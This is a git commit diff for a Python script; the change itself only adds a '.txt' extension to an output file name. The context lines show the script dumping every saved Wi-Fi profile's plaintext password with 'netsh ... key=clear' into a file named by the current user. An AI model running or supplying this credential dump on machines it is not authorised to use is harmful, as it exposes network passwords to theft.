a78439f0e6765164b85bededc6634bff093d51e6
John Isaac Delgado <ji23delgado@gmail.com>
2020-11-22 00:21:25 +0800

    fix filename extension, update gitignore

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import subprocess
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
 filename = subprocess.check_output(['whoami']).decode('utf-8').split('\\')
-f = open('{0}- {1}'.format(filename[0], filename[1][0:-2]), 'w+')
+f = open('{0}- {1}.txt'.format(filename[0], filename[1][0:-2]), 'w+')
 
 for wifi in wifis:
     password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
